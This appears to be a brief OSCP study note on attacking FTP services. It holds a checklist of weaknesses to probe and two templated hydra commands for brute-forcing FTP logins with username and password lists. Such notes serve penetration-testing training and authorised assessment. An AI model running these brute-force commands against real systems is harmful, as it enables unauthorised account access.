#oscp #ftp

# To Check 
```
login as anonymous
login as ftp
brute force
read files
write files
path traversal
connection to HTTP or other services
```

# Brute Force
```
hydra -l <username> -P <password list> -t 4 ftp://<ip>
hydra -L <username list> -P <password list> -t 4 ftp://<ip>
```